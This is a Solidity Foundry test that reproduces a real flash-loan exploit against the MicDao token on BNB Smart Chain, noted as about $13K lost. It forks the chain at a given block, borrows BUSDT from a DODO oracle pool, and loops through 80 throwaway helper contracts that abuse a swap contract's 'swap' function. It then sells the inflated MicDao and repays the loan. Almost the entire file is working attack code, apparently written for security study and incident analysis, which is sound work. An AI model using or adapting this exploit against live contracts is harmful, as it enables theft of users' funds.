// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$13K
// Attacker : https://bscscan.com/address/0xcd03ed98868a6cd78096f116a4b56a5f2c67757d
// Attack Contract : https://bscscan.com/address/0x502b4a51ca7900f391d474268c907b110a277d6f
// Victim Contract : https://bscscan.com/address/0xf6876f6ab2637774804b85aecc17b434a2b57168
// Attack Tx : https://bscscan.com/tx/0x24a2fbb27d433d91372525954f0d7d1af7509547b9ada29cc6c078e732c6d075

// @Analysis
// https://twitter.com/CertiKAlert/status/1714677875427684544
// https://twitter.com/ChainAegis/status/1714837519488205276

interface ISwapContract {
    function swap(uint256 amount, address originToken) external;
}

contract ContractTest is Test {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    IDPPOracle private constant DPPOracle = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 32_711_747);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(MicDao), "MicDao");
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "Attacker BUSDT balance before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        DPPOracle.flashLoan(0, (BUSDT.balanceOf(address(DPPOracle)) * 99) / 100, address(this), abi.encode(0));

        emit log_named_decimal_uint(
            "Attacker BUSDT balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        BUSDT.approve(address(Router), type(uint256).max);
        MicDao.approve(address(Router), type(uint256).max);
        BUSDTToMicDao();

        // Start exploit
        uint8 i;
        while (i < 80) {
            HelperContract Helper = new HelperContract();
            BUSDT.transfer(address(Helper), 2000 * 1e18);
            Helper.work();
            ++i;
        }
        // End exploit

        // Swap much more MicDao tokens to BUSDT
        MicDaoToBUSDT();
        // Repay flashloan and keep profit
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    receive() external payable {}

    function BUSDTToMicDao() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(MicDao);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            500_000 * 1e18, 0, path, address(this), block.timestamp + 1000
        );
    }

    function MicDaoToBUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(MicDao);
        path[1] = address(BUSDT);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MicDao.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }
}

contract HelperContract {
    ISwapContract private constant SwapContract = ISwapContract(0x19345233ea7486c1D5d780A19F0e303597E480b5);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function work() external {
        BUSDT.approve(address(SwapContract), type(uint256).max);
        SwapContract.swap(2000 * 1e18, owner);
        MicDao.transfer(owner, MicDao.balanceOf(address(this)));
        selfdestruct(payable(owner));
    }
}
